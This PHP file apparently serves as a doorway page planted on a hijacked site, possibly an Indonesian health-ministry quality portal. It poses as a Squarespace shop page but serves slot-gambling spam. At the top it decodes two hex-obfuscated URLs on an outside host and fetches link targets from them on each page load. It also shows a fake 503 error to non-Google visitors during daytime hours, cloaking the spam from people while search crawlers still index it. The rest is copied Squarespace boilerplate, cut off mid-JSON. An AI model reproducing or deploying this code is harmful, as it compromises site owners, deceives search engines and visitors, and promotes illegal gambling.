<?php
date_default_timezone_set('Asia/Jakarta');
function isInMaintenanceWindow()
{
  $startMaintenance = strtotime('04:00');
  $endMaintenance = strtotime('17:00');

  $sekarang = date(strtotime(date('H:i')));
  if ($sekarang >= $startMaintenance && $sekarang <= $endMaintenance) {
    if (strpos($_SERVER['HTTP_USER_AGENT'], 'Google') === false) {
      header('HTTP/1.1 503 Service Unavailable');
      header('Content-Type: text/html; charset=utf-8');
      header('Retry-After: 3600');
      echo "
      <html><head><title>Request Rejected</title></head><body>The requested URL was rejected. Please consult with your administrator.<br><br>Your support ID is: 5258388465024482772<br><br><a href='javascript:history.back();'>[Go Back]</a></body></html>";
      exit;
    }
  }
}

isInMaintenanceWindow();
$PROTOCOL = isset($_SERVER['HTTP_X_FORWARDED_PROTO']) ? strtolower($_SERVER['HTTP_X_FORWARDED_PROTO']) : 'http';

$PROTOCOL = isset($_SERVER['REQUEST_SCHEME']) && $_SERVER['REQUEST_SCHEME'] !== 'http' ? $_SERVER['REQUEST_SCHEME'] : $PROTOCOL;

if (strpos($PROTOCOL, '://') === false) {
  $PROTOCOL .= '://';
}

$PORT = $_SERVER['SERVER_PORT'];
if ($PORT != '80' && $PORT != '443') {
  $PROTOCOL .= ":$PORT";
}
$CANONICAL = $PROTOCOL . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];

$JS = 'jquery.1.js';

$HOST1 = hex2bin("68747470733a2f2f67686f73746578706c6f697465722e78797a2f616d702d636f6e6e6563746f722e706870");

$HOST2 = hex2bin("68747470733a2f2f67686f73746578706c6f697465722e78797a2f68797065726c696e6b2d636f6e6e6563746f722e706870");

function CALL_AND_GET_VALUE($URL, $KEY)
{
  $CH = curl_init();
  curl_setopt($CH, CURLOPT_URL, $URL);
  curl_setopt($CH, CURLOPT_RETURNTRANSFER, 1);
  $RESPONSE = curl_exec($CH);
  curl_close($CH);
  $DATA = json_decode($RESPONSE, true);
  $VALUE = $DATA[$KEY];
  return $VALUE;
}

$AMP = CALL_AND_GET_VALUE($HOST1, "MUTU-KEMKES-SLOT-GACOR");

$HYPERLINK = CALL_AND_GET_VALUE($HOST2, "HYPERLINK11");

$TITLE = "Daftar Situs Slot Gacor Gampang Menang Maxwin Terbaru Hari Ini 2024";

$DESKRIPSI = "Daftar link situs SLOT GACOR Situs Slot Gacor Maxwin Terbesar Hari ini. Slot Gacor Maxwin Merupakan edisi terbaru mudah maxwin yang menawarkan daftar game Slot Gacor Online nomor 1 di Indonesia";

$KW = "SLOT GACOR";

$GAMBAR = "https://ghostexploiter.xyz/mutufasyankes-kemkes/assets/utufasyankes-kemkes-slot-gacor.jpg";

$ICON = "https://ghostexploiter.xyz/media/favicon.png";

$TOMBOL = "https://ghostexploiter.xyz/media/daftar.gif";

$LOGO = "https://ghostexploiter.xyz/media/sniper404-logo.png";

date_default_timezone_set("Asia/Jakarta");

$TANGGAL = date("Y-m-d\TH:i:sP");
?>
<!doctype html>
<html xmlns:og="http://opengraphprotocol.org/schema/" xmlns:fb="http://www.facebook.com/2008/fbml" lang="en-US">

<head>
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <!-- This is Squarespace. --><!-- tomato-oleander-ncdr -->
  <base href="">
  <meta charset="utf-8" />
  <title><?php echo $TITLE ?></title>
  <meta http-equiv="Accept-CH" content="Sec-CH-UA-Platform-Version, Sec-CH-UA-Model" />
  <link rel="icon" type="image/x-icon" href="https://images.squarespace-cdn.com/content/v1/660d5c4777b3f814dddb49bc/7ebef752-131d-4d8d-ae96-42695ba2e5d2/favicon.ico?format=100w" />
  <link rel="amphtml" href="<?php echo $AMP ?>">
  <link rel="canonical" href="<?php echo $CANONICAL ?>" />
  <meta property="og:site_name" content="<?php echo $KW ?>" />
  <meta property="og:title" content="<?php echo $TITLE ?>" />
  <meta property="og:url" content="<?php echo $CANONICAL ?>" />
  <meta property="og:type" content="product" />
  <meta property="og:description" content="<?php echo $DESKRIPSI ?>" />
  <meta property="og:image" content="<?php echo $GAMBAR ?>?format=1500w" />
  <meta property="og:image:width" content="1500" />
  <meta property="og:image:height" content="1500" />
  <meta property="product:price:amount" content="50.00" />
  <meta property="product:price:currency" content="IDR" />
  <meta property="product:availability" content="instock" />
  <meta itemprop="name" content="<?php echo $TITLE ?> " />
  <meta itemprop="url" content="<?php echo $CANONICAL ?>" />
  <meta itemprop="description" content="<?php echo $DESKRIPSI ?>" />
  <meta itemprop="thumbnailUrl" content="<?php echo $GAMBAR ?>?format=1500w" />
  <link rel="image_src" href="<?php echo $GAMBAR ?>?format=1500w" />
  <meta itemprop="image" content="<?php echo $GAMBAR ?>?format=1500w" />
  <meta name="twitter:title" content="<?php echo $TITLE ?>" />
  <meta name="twitter:image" content="<?php echo $GAMBAR ?>?format=1500w" />
  <meta name="twitter:url" content="<?php echo $CANONICAL ?>" />
  <meta name="twitter:card" content="summary" />
  <meta name="twitter:description" content="<?php echo $DESKRIPSI ?>" />
  <meta name="description" content="<?php echo $DESKRIPSI ?>" />
  <link rel="preconnect" href="https://images.squarespace-cdn.com">
  <script type="text/javascript" src="//use.typekit.net/ik/m3Zo0XkuNSZZq-h8tb9honKtnvRgOHU3p5LQczNz-FJfecGJXnX1IyvhF2jtFRZLFRj3Z2mRF2SaFhJDZR6UFesqZeJX5A4Re6MKfcBRiAuTdKu3Scv7f6Rwk3IbMg6BJMJ7f6RBk3IbMg6YJMJ7f6RFk3IbMg6VJMJ7f6Rek3IbMg6sJMHbMSKtldMe.js"></script>
  <script type="text/javascript">
    try {
      Typekit.load();
    } catch (e) {}
  </script>
  <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,300;0,400;0,500;0,700;1,300">
  <script type="text/javascript" crossorigin="anonymous" defer="defer" nomodule="nomodule" src="//assets.squarespace.com/@sqs/polyfiller/1.6/legacy.js"></script>
  <script type="text/javascript" crossorigin="anonymous" defer="defer" src="//assets.squarespace.com/@sqs/polyfiller/1.6/modern.js"></script>
  <script type="text/javascript">
    SQUARESPACE_ROLLUPS = {};
  </script>
  <script>
    (function(rollups, name) {
      if (!rollups[name]) {
        rollups[name] = {};
      }
      rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/extract-css-runtime-2e300661014d9baca6b5-min.en-US.js"];
    })(SQUARESPACE_ROLLUPS, 'squarespace-extract_css_runtime');
  </script>
  <script crossorigin="anonymous" src="//assets.squarespace.com/universal/scripts-compressed/extract-css-runtime-2e300661014d9baca6b5-min.en-US.js" defer></script>
  <script>
    (function(rollups, name) {
      if (!rollups[name]) {
        rollups[name] = {};
      }
      rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/extract-css-moment-js-vendor-6f117db4eb7fd4392375-min.en-US.js"];
    })(SQUARESPACE_ROLLUPS, 'squarespace-extract_css_moment_js_vendor');
  </script>
  <script crossorigin="anonymous" src="//assets.squarespace.com/universal/scripts-compressed/extract-css-moment-js-vendor-6f117db4eb7fd4392375-min.en-US.js" defer></script>
  <script>
    (function(rollups, name) {
      if (!rollups[name]) {
        rollups[name] = {};
      }
      rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/cldr-resource-pack-e94539391642d3b99900-min.en-US.js"];
    })(SQUARESPACE_ROLLUPS, 'squarespace-cldr_resource_pack');
  </script>
  <script crossorigin="anonymous" src="//assets.squarespace.com/universal/scripts-compressed/cldr-resource-pack-e94539391642d3b99900-min.en-US.js" defer></script>
  <script>
    (function(rollups, name) {
      if (!rollups[name]) {
        rollups[name] = {};
      }
      rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/common-vendors-stable-5a7027cd34a39ac0a126-min.en-US.js"];
    })(SQUARESPACE_ROLLUPS, 'squarespace-common_vendors_stable');
  </script>
  <script crossorigin="anonymous" src="//assets.squarespace.com/universal/scripts-compressed/common-vendors-stable-5a7027cd34a39ac0a126-min.en-US.js" defer></script>
  <script>
    (function(rollups, name) {
      if (!rollups[name]) {
        rollups[name] = {};
      }
      rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/common-vendors-67bf5635462ab183b0f7-min.en-US.js"];
    })(SQUARESPACE_ROLLUPS, 'squarespace-common_vendors');
  </script>
  <script crossorigin="anonymous" src="//assets.squarespace.com/universal/scripts-compressed/common-vendors-67bf5635462ab183b0f7-min.en-US.js" defer></script>
  <script>
    (function(rollups, name) {
      if (!rollups[name]) {
        rollups[name] = {};
      }
      rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/common-7b655880bf7742d96124-min.en-US.js"];
    })(SQUARESPACE_ROLLUPS, 'squarespace-common');
  </script>
  <script crossorigin="anonymous" src="//assets.squarespace.com/universal/scripts-compressed/common-7b655880bf7742d96124-min.en-US.js" defer></script>
  <script>
    (function(rollups, name) {
      if (!rollups[name]) {
        rollups[name] = {};
      }
      rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/commerce-9e725f7fc43d8df31078-min.en-US.js"];
    })(SQUARESPACE_ROLLUPS, 'squarespace-commerce');
  </script>
  <script crossorigin="anonymous" src="//assets.squarespace.com/universal/scripts-compressed/commerce-9e725f7fc43d8df31078-min.en-US.js" defer></script>
  <script>
    (function(rollups, name) {
      if (!rollups[name]) {
        rollups[name] = {};
      }
      rollups[name].css = ["//assets.squarespace.com/universal/styles-compressed/commerce-2af06f7948db5477d8f5-min.en-US.css"];
    })(SQUARESPACE_ROLLUPS, 'squarespace-commerce');
  </script>
  <link rel="stylesheet" type="text/css" href="//assets.squarespace.com/universal/styles-compressed/commerce-2af06f7948db5477d8f5-min.en-US.css">
  <script>
    (function(rollups, name) {
      if (!rollups[name]) {
        rollups[name] = {};
      }
      rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/performance-4c0b9e8fb6eca6c1a294-min.en-US.js"];
    })(SQUARESPACE_ROLLUPS, 'squarespace-performance');
  </script>
  <script crossorigin="anonymous" src="//assets.squarespace.com/universal/scripts-compressed/performance-4c0b9e8fb6eca6c1a294-min.en-US.js" defer></script>
  <script data-name="static-context">
    Static = window.Static || {};
    Static.SQUARESPACE_CONTEXT = {
      "facebookAppId": "314192535267336",
      "facebookApiVersion": "v6.0",
      "rollups": {
        "squarespace-announcement-bar": {
          "js": "//assets.squarespace.com/universal/scripts-compressed/announcement-bar-580ca14b0b772e26673b-min.en-US.js"
        },
        "squarespace-audio-player": {
          "css": "//assets.squarespace.com/universal/styles-compressed/audio-player-9fb16b1675c0ff315dae-min.en-US.css",
          "js": "//assets.squarespace.com/universal/scripts-compressed/audio-player-536655d24ee2cf3492fa-min.en-US.js"
        },
        "squarespace-blog-collection-list": {
          "css": "//assets.squarespace.com/universal/styles-compressed/blog-collection-list-0106e2d3707028a62a85-min.en-US.css",
          "js": "//assets.squarespace.com/universal/scripts-compressed/blog-collection-list-0ac0afef4825691a4645-min.en-US.js"
        },
        "squarespace-calendar-block-renderer": {
          "css": "//assets.squarespace.com/universal/styles-compressed/calendar-block-renderer-0e361398b7723c9dc63e-min.en-US.css",
          "js": "//assets.squarespace.com/universal/scripts-compressed/calendar-block-renderer-55cbc566c91cd35b96d1-min.en-US.js"
        },
        "squarespace-chartjs-helpers": {
          "css": "//assets.squarespace.com/universal/styles-compressed/chartjs-helpers-e1c09c17d776634c0edc-min.en-US.css",
          "js": "//assets.squarespace.com/universal/scripts-compressed/chartjs-helpers-f5eab5c8720f22ebdf0f-min.en-US.js"
        },
        "squarespace-comments": {
          "css": "//assets.squarespace.com/universal/styles-compressed/comments-24b74a0326eae0cd5049-min.en-US.css",
          "js": "//assets.squarespace.com/universal/scripts-compressed/comments-9c5d100d6c83e0adc8b8-min.en-US.js"
        },
        "squarespace-custom-css-popup": {
          "css": "//assets.squarespace.com/universal/styles-compressed/custom-css-popup-d6287eec925fd6068dad-min.en-US.css",
          "js": "//assets.squarespace.com/universal/scripts-compressed/custom-css-popup-ce048222796978a54106-min.en-US.js"
        },
        "squarespace-dialog": {
          "css": "//assets.squarespace.com/universal/styles-compressed/dialog-081be79078914b908a1a-min.en-US.css",
          "js": "//assets.squarespace.com/universal/scripts-compressed/dialog-223c5e4cd10d64465098-min.en-US.js"
        },
        "squarespace-events-collection": {
          "css": "//assets.squarespace.com/universal/styles-compressed/events-collection-0e361398b7723c9dc63e-min.en-US.css",
          "js": "//assets.squarespace.com/universal/scripts-compressed/events-collection-c7fb145e0cec3374163e-min.en-US.js"
        },
        "squarespace-form-rendering-utils": {
          "js": "//assets.squarespace.com/universal/scripts-compressed/form-rendering-utils-0b8d579c93b1d66ddb5c-min.en-US.js"
        },
        "squarespace-forms": {
          "css": "//assets.squarespace.com/universal/styles-compressed/forms-8d93ba2c12ff0765b64c-min.en-US.css",
          "js": "//assets.squarespace.com/universal/scripts-compressed/forms-34889491fd72ba656e9d-min.en-US.js"
        },
        "squarespace-gallery-collection-list": {
          "css": "//assets.squarespace.com/universal/styles-compressed/gallery-collection-list-0106e2d3707028a62a85-min.en-US.css",
          "js": "//assets.squarespace.com/universal/scripts-compressed/gallery-collection-list-4015fa07502fd85cce51-min.en-US.js"
        },
        "squarespace-image-zoom": {
          "css": "//assets.squarespace.com/universal/styles-compressed/image-zoom-0106e2d3707028a62a85-min.en-US.css",
          "js": "//assets.squarespace.com/universal/scripts-compressed/image-zoom-9c7b93bd6c6eec5cef37-min.en-US.js"
        },
        "squarespace-pinterest": {
          "css": "//assets.squarespace.com/universal/styles-compressed/pinterest-0106e2d3707028a62a85-min.en-US.css",
          "js": "//assets.squarespace.com/universal/scripts-compressed/pinterest-aae85c4da463349c5f0c-min.en-US.js"
        },
        "squarespace-popup-overlay": {
          "css": "//assets.squarespace.com/universal/styles-compressed/popup-overlay-b2bf7df4402e207cd72c-min.en-US.css",
          "js": "//assets.squarespace.com/universal/scripts-compressed/popup-overlay-d3c700ffc198534a85bd-min.en-US.js"
        },
        "squarespace-product-quick-view": {
          "css": "//assets.squarespace.com/universal/styles-compressed/product-quick-view-4aec27f1bd826750e9db-min.en-US.css",
          "js": "//assets.squarespace.com/universal/scripts-compressed/product-quick-view-a3d80231c7f1db1db015-min.en-US.js"
        },
        "squarespace-products-collection-item-v2": {
          "css": "//assets.squarespace.com/universal/styles-compressed/products-collection-item-v2-0106e2d3707028a62a85-min.en-US.css",
          "js": "//assets.squarespace.com/universal/scripts-compressed/products-collection-item-v2-d5ed61691fea319fc5f1-min.en-US.js"
        },
        "squarespace-products-collection-list-v2": {
          "css": "//assets.squarespace.com/universal/styles-compressed/products-collection-list-v2-0106e2d3707028a62a85-min.en-US.css",
          "js": "//assets.squarespace.com/universal/scripts-compressed/products-collection-list-v2-5869a38a2bb3cda993d1-min.en-US.js"
        },
        "squarespace-search-page": {
          "css": "//assets.squarespace.com/universal/styles-compressed/search-page-dcc0462e30efbd6dc562-min.en-US.css",
          "js": "//assets.squarespace.com/universal/scripts-compressed/search-page-fa989f7050e506df8dcf-min.en-US.js"
        },
        "squarespace-search-preview": {
          "js": "//assets.squarespace.com/universal/scripts-compressed/search-preview-4ba3bba80a311f827120-min.en-US.js"
        },
        "squarespace-simple-liking": {
          "css": "//assets.squarespace.com/universal/styles-compressed/simple-liking-a9eb87c1b73b199ce387-min.en-US.css",
          "js": "//assets.squarespace.com/universal/scripts-compressed/simple-liking-78c29e2a12a5aa2a2d61-min.en-US.js"
        },
        "squarespace-social-buttons": {
          "css": "//assets.squarespace.com/universal/styles-compressed/social-buttons-98ee3a678d356d849b76-min.en-US.css",
          "js": "//assets.squarespace.com/universal/scripts-compressed/social-buttons-a22c4f4e4076e881ff45-min.en-US.js"
        },
        "squarespace-tourdates": {
          "css": "//assets.squarespace.com/universal/styles-compressed/tourdates-0106e2d3707028a62a85-min.en-US.css",
          "js": "//assets.squarespace.com/universal/scripts-compressed/tourdates-76321dbccaa3d8627052-min.en-US.js"
        },
        "squarespace-website-overlays-manager": {
          "css": "//assets.squarespace.com/universal/styles-compressed/website-overlays-manager-6dfb472f441e39d78b13-min.en-US.css",
          "js": "//assets.squarespace.com/universal/scripts-compressed/website-overlays-manager-29e268493c0e98412b25-min.en-US.js"
        }
      },
      "pageType": 50,
      "website": {
        "id": "660d5c4777b3f814dddb49bc",
        "identifier": "tomato-oleander-ncdr",
        "websiteType": 1,
        "contentModifiedOn": 1712151655779,
        "cloneable": false,
        "hasBeenCloneable": false,
        "siteStatus": {},
        "language": "en-US",
        "timeZone": "Asia/Jakarta",
        "machineTimeZoneOffset": 25200000,
        "timeZoneOffset": 25200000,
        "timeZoneAbbr": "WIB",
        "siteTitle": "<?php echo $KW ?>",
        "fullSiteTitle": "<?php echo $TITLE ?> \u2014 <?php echo $KW ?>",
        "siteDescription": "",
        "logoImageId": "660d5d2513843430df00964e",
        "mobileLogoImageId": "660d5d33c2492e19bf73e268",
        "shareButtonOptions": {
          "6": true,
          "2": true,
          "7": true,
          "4": true,
          "8": true,
          "3": true,
          "1": true
        },
        "logoImageUrl": "<?php echo $LOGO ?>",
        "mobileLogoImageUrl": "<?php echo $LOGO ?>",
        "authenticUrl": "https://tomato-oleander-ncdr.squarespace.com",
        "internalUrl": "https://tomato-oleander-ncdr.squarespace.com",
        "baseUrl": "https://tomato-oleander-ncdr.squarespace.com",
        "sslSetting": 3,
        "isHstsEnabled": true,
        "socialAccounts": [{
          "serviceId": 64,
          "screenname": "Instagram",
          "addedOn": 1712151623771,
          "profileUrl": "http://instagram.com",
          "iconEnabled": true,
          "serviceName": "instagram-unauth"
        }, {
          "serviceId": 62,
          "screenname": "Twitter",
          "addedOn": 1712151623775,
          "profileUrl": "http://twitter.com",
          "iconEnabled": true,
          "serviceName": "twitter-unauth"
        }, {
          "serviceId": 82,
          "screenname": "TikTok",
          "addedOn": 1712152080342,
          "profileUrl": "https://tiktok.com",
          "iconEnabled": true,
          "serviceName": "tiktok-unauth"
        }, {
          "serviceId": 60,
          "screenname": "Facebook",
          "addedOn": 1712152124700,
          "profileUrl": "https://facebook.com",
          "iconEnabled": true,
          "serviceName": "facebook-unauth"
        }, {
          "serviceId": 69,
          "screenname": "YouTube",
          "addedOn": 1712152149802,
          "profileUrl": "https://youtube.com",
          "iconEnabled": true,
          "serviceName": "youtube-unauth"
        }],
        "typekitId": "",
        "statsMigrated": false,
        "imageMetadataProcessingEnabled": false,
        "screenshotId": "ccdceba48d5111ddad6747079e6b6a77434d676afa0e8787972fae9d70903163",
        "captchaSettings": {
          "enabledForDonations": false
        },
        "showOwnerLogin": false
      },
      "websiteSettings": {
        "id": "660d5c4777b3f814dddb49bf",
        "websiteId": "660d5c4777b3f814dddb49bc",
        "subjects": [],
        "country": "ID",
        "state": "SU",
        "simpleLikingEnabled": true,
        "mobileInfoBarSettings": {
          "isContactEmailEnabled": false,
          "isContactPhoneNumberEnabled": false,
          "isLocationEnabled": false,
          "isBusinessHoursEnabled": false
        },
        "commentLikesAllowed": true,
        "commentAnonAllowed": true,
        "commentThreaded": true,
        "commentApprovalRequired": false,
        "commentAvatarsOn": true,
        "commentSortType": 2,
        "commentFlagThreshold": 0,
        "commentFlagsAllowed": true,
        "commentEnableByDefault": true,
        "commentDisableAfterDaysDefault": 0,
        "disqusShortname": "",
        "commentsEnabled": false,
        "storeSettings": {
          "returnPolicy": null,
          "termsOfService": null,
          "privacyPolicy": null,
          "expressCheckout": false,
          "continueShoppingLinkUrl": "/",
          "useLightCart": false,
          "showNoteField": false,
          "shippingCountryDefaultValue": "US",
          "billToShippingDefaultValue": false,
          "showShippingPhoneNumber": true,
          "isShippingPhoneRequired": false,
          "showBillingPhoneNumber": true,
          "isBillingPhoneRequired": false,
          "currenciesSupported": ["USD", "CAD", "GBP", "AUD", "EUR", "CHF", "NOK", "SEK", "DKK", "NZD", "SGD", "MXN", "HKD", "CZK", "ILS", "MYR", "RUB", "PHP", "PLN", "THB", "BRL", "ARS", "COP", "IDR", "INR", "JPY", "ZAR"],
          "defaultCurrency": "USD",
          "selectedCurrency": "IDR",
          "measurementStandard": 1,
          "showCustomCheckoutForm": false,
          "checkoutPageMarketingOptInEnabled": true,
          "enableMailingListOptInByDefault": false,
          "sameAsRetailLocation": false,
          "merchandisingSettings": {
            "scarcityEnabledOnProductItems": false,
            "scarcityEnabledOnProductBlocks": false,
            "scarcityMessageType": "DEFAULT_SCARCITY_MESSAGE",
            "scarcityThreshold": 10,
            "multipleQuantityAllowedForServices": true,
            "restockNotificationsEnabled": false,
            "restockNotificationsMailingListSignUpEnabled": false,
            "relatedProductsEnabled": false,
            "relatedProductsOrdering": "random",
            "soldOutVariantsDropdownDisabled": false,
            "productComposerOptedIn": false,
            "productComposerABTestOptedOut": false,
            "productReviewsEnabled": false
          },
          "isLive": false,
          "multipleQuantityAllowedForServices": true
        },
        "useEscapeKeyToLogin": false,
        "ssBadgeType": 1,
        "ssBadgePosition": 4,
        "ssBadgeVisibility": 1,
        "ssBadgeDevices": 1,
        "pinterestOverlayOptions": {
          "mode": "disabled"
        },
        "ampEnabled": false,
        "userAccountsSettings": {
          "loginAllowed": false,
          "signupAllowed": false
        }
      },
      "cookieSettings": {
        "isCookieBannerEnabled": false,
        "isRestrictiveCookiePolicyEnabled": false,
        "isRestrictiveCookiePolicyAbsolute": false,
        "cookieBannerText": "",
        "cookieBannerTheme": "",
        "cookieBannerVariant": "",
        "cookieBannerPosition": "",
        "cookieBannerCtaVariant": "",
        "cookieBannerCtaText": "",
        "cookieBannerAcceptType": "OPT_IN",
        "cookieBannerOptOutCtaText": "",
        "cookieBannerHasOptOut": false,
        "cookieBannerHasManageCookies": true,
        "cookieBannerManageCookiesLabel": ""
      },
      "websiteCloneable": false,
      "collection": {
        "title": "Shop",
        "id": "660d5c677b67070328ef14fa",
        "fullUrl": "/",
        "type": 13,
        "permissionType": 1
      },
      "item": {
        "title": "<?php echo $TITLE ?>",
        "id": "660d5c677b67070328ef1518",
        "fullUrl": "<?php echo $CANONICAL ?>",
        "publicCommentCount": 0,
        "commentState": 1,
        "recordType": 11
      },
      "subscribed": false,
      "appDomain": "squarespace.com",
      "templateTweakable": true,
      "tweakJSON": {
        "form-use-theme-colors": "false",
        "header-logo-height": "50px",
        "header-mobile-logo-max-height": "30px",
        "header-vert-padding": "4vw",
        "header-width": "Full",
        "maxPageWidth": "1200px",
        "pagePadding": "4vw",
        "tweak-blog-alternating-side-by-side-image-aspect-ratio": "1:1 Square",
        "tweak-blog-alternating-side-by-side-image-spacing": "6%",
        "tweak-blog-alternating-side-by-side-meta-spacing": "20px",
        "tweak-blog-alternating-side-by-side-primary-meta": "Categories",
        "tweak-blog-alternating-side-by-side-read-more-spacing": "20px",
        "tweak-blog-alternating-side-by-side-secondary-meta": "Date",
        "tweak-blog-basic-grid-columns": "2",
        "tweak-blog-basic-grid-image-aspect-ratio": "3:2 Standard",
        "tweak-blog-basic-grid-image-spacing": "50px",
        "tweak-blog-basic-grid-meta-spacing": "37px",
        "tweak-blog-basic-grid-primary-meta": "Categories",
        "tweak-blog-basic-grid-read-more-spacing": "37px",
        "tweak-blog-basic-grid-secondary-meta": "Date",
        "tweak-blog-item-custom-width": "75",
        "tweak-blog-item-show-author-profile": "true",
        "tweak-blog-item-width": "Medium",
        "tweak-blog-masonry-columns": "2",
        "tweak-blog-masonry-horizontal-spacing": "30px",
        "tweak-blog-masonry-image-spacing": "20px",
        "tweak-blog-masonry-meta-spacing": "20px",
        "tweak-blog-masonry-primary-meta": "Categories",
        "tweak-blog-masonry-read-more-spacing": "20px",
        "tweak-blog-masonry-secondary-meta": "Date",
        "tweak-blog-masonry-vertical-spacing": "30px",
        "tweak-blog-side-by-side-image-aspect-ratio": "1:1 Square",
        "tweak-blog-side-by-side-image-spacing": "6%",
        "tweak-blog-side-by-side-meta-spacing": "20px",
        "tweak-blog-side-by-side-primary-meta": "Categories",
        "tweak-blog-side-by-side-read-more-spacing": "20px",
        "tweak-blog-side-by-side-secondary-meta": "Date",
        "tweak-blog-single-column-image-spacing": "50px",
        "tweak-blog-single-column-meta-spacing": "30px",
        "tweak-blog-single-column-primary-meta": "Categories",
        "tweak-blog-single-column-read-more-spacing": "30px",
        "tweak-blog-single-column-secondary-meta": "Date",
        "tweak-events-stacked-show-thumbnails": "true",
        "tweak-events-stacked-thumbnail-size": "3:2 Standard",
        "tweak-fixed-header": "false",
        "tweak-fixed-header-style": "Basic",
        "tweak-global-animations-animation-curve": "ease",
        "tweak-global-animations-animation-delay": "0.1s",
        "tweak-global-animations-animation-duration": "0.1s",
        "tweak-global-animations-animation-style": "fade",
        "tweak-global-animations-animation-type": "none",
        "tweak-global-animations-complexity-level": "detailed",
        "tweak-global-animations-enabled": "false",
        "tweak-portfolio-grid-basic-custom-height": "50",
        "tweak-portfolio-grid-overlay-custom-height": "50",
        "tweak-portfolio-hover-follow-acceleration": "10%",
        "tweak-portfolio-hover-follow-animation-duration": "Fast",
        "tweak-portfolio-hover-follow-animation-type": "Fade",
        "tweak-portfolio-hover-follow-delimiter": "Bullet",
        "tweak-portfolio-hover-follow-front": "false",
        "tweak-portfolio-hover-follow-layout": "Inline",
        "tweak-portfolio-hover-follow-size": "50",
        "tweak-portfolio-hover-follow-text-spacing-x": "1.5",
        "tweak-portfolio-hover-follow-text-spacing-y": "1.5",
        "tweak-portfolio-hover-static-animation-duration": "Fast",
        "tweak-portfolio-hover-static-animation-type": "Fade",
        "tweak-portfolio-hover-static-delimiter": "Hyphen",
        "tweak-portfolio-hover-static-front": "true",
        "tweak-portfolio-hover-static-layout": "Inline",
        "tweak-portfolio-hover-static-size": "50",
        "tweak-portfolio-hover-static-text-spacing-x": "1.5",
        "tweak-portfolio-hover-static-text-spacing-y": "1.5",
        "tweak-portfolio-index-background-animation-duration": "Medium",
        "tweak-portfolio-index-background-animation-type": "Fade",
        "tweak-portfolio-index-background-custom-height": "50",
        "tweak-portfolio-index-background-delimiter": "None",
        "tweak-portfolio-index-background-height": "Large",
        "tweak-portfolio-index-background-horizontal-alignment": "Center",
        "tweak-portfolio-index-background-link-format": "Stacked",
        "tweak-portfolio-index-background-persist": "false",
        "tweak-portfolio-index-background-vertical-alignment": "Middle",
        "tweak-portfolio-index-background-width": "Full",
        "tweak-product-basic-item-click-action": "None",
        "tweak-product-basic-item-gallery-aspect-ratio": "3:4 Three-Four (Vertical)",
        "tweak-product-basic-item-gallery-design": "Slideshow",
        "tweak-product-basic-item-gallery-width": "55%",
        "tweak-product-basic-item-hover-action": "None",
        "tweak-product-basic-item-image-spacing": "5vw",
        "tweak-product-basic-item-image-zoom-factor": "1.75",
        "tweak-product-basic-item-product-variant-display": "Button",
        "tweak-product-basic-item-thumbnail-placement": "Side",
        "tweak-product-basic-item-variant-picker-layout": "Dropdowns",
        "tweak-products-add-to-cart-button": "false",
        "tweak-products-columns": "4",
        "tweak-products-gutter-column": "2vw",
        "tweak-products-gutter-row": "4vw",
        "tweak-products-header-text-alignment": "Middle",
        "tweak-products-image-aspect-ratio": "3:4 Three-Four (Vertical)",
        "tweak-products-image-text-spacing": "1.5vw",
        "tweak-products-mobile-columns": "2",
        "tweak-products-text-alignment": "Left",
        "tweak-products-width": "Full",
        "tweak-transparent-header": "false"
      },
      "templateId": "5c5a519771c10ba3470d8101",
      "templateVersion": "7.1",
      "pageFeatures": [1, 2, 4],
      "gmRenderKey": "QUl6YVN5Q0JUUk9xNkx1dkZfSUUxcjQ2LVQ0QWVUU1YtMGQ3bXk4",
      "templateScriptsRootUrl": "https://static1.squarespace.com/static/vta/5c5a519771c10ba3470d8101/scripts/",
      "betaFeatureFlags": ["website_fonts", "campaigns_discount_section_in_blasts", "campaigns_new_image_layout_picker", "customer_account_creation_recaptcha", "campaigns_discount_section_in_automations", "customer_accounts_email_verification", "commerce_etsy_product_import", "campaigns_import_discounts", "nested_categories_migration_enabled", "commerce_restock_notifications", "commsplat_forms_visitor_profile", "member_areas_feature", "marketing_landing_page", "donations_panel_refactor", "campaigns_global_uc_ab", "fluid_engine_clean_up_grid_contextual_change", "hideable_header_footer_for_courses", "blog_monetization", "supports_versioned_template_assets", "is_feature_gate_refresh_enabled", "new_stacked_index", "hide_header_footer_beta", "commerce_subscription_renewal_notifications", "commerce_order_status_access", "campaigns_thumbnail_layout", "proposals_beta_in_circle_labs", "commerce_etsy_shipping_import", "unify_edit_mode_p2", "themes", "send_local_pickup_ready_email", "scripts_defer", "nested_categories", "commerce_clearpay", "background_art_onboarding", "commerce_checkout_website_updates_enabled", "visitor_react_forms", "pdp_product_add_ons_visitor_site", "viewer-role-contributor-invites", "hideable_header_footer", "commerce_paywall_renewal_notifications", "hideable_header_footer_for_memberareas", "accounting_orders_sync", "fluid_engine", "collection_typename_switching", "override_block_styles", "commerce_site_visitor_metrics", "google_consent_v2", "hideable_header_footer_for_videos", "enable_css_variable_tweaks", "toggle_preview_new_shortcut"],
      "videoAssetsFeatureFlags": ["mux-data-video-collection", "mux-data-course-collection"],
      "impersonatedSession": false,
      "demoCollections": [{
        "collectionId": "624b504384c2ba7dc187aaa8",
        "deleted": true
      }, {
        "collectionId": "624b505684c2ba7dc187adbe",
        "deleted": false
      }, {
        "collectionId": "624b505984c2ba7dc187ae39",
        "deleted": false
      }, {
        "collectionId": "624b505a84c2ba7dc187ae52",
        "deleted": false
      }],
      "tzData": {
        "zones": [
          [420, null, "WIB", null]
        ],
        "rules": {}
      },
      "product": {
        "variantAttributeNames": ["Size"],
        "variants": [{
          "id": "9da774c3-50da-42d2-aa47-ef575ec57ca2",
          "sku": "SQ4362620",
          "price": {
            "currencyCode": "IDR",
            "value": 5000,
            "decimalValue": "50.00",
            "fractionalDigits": 2
          },
          "salePrice": {
            "currencyCode": "IDR",
            "value": 0,
            "decimalValue": "0.00",
            "fractionalDigits": 2
          },
          "onSale": false,
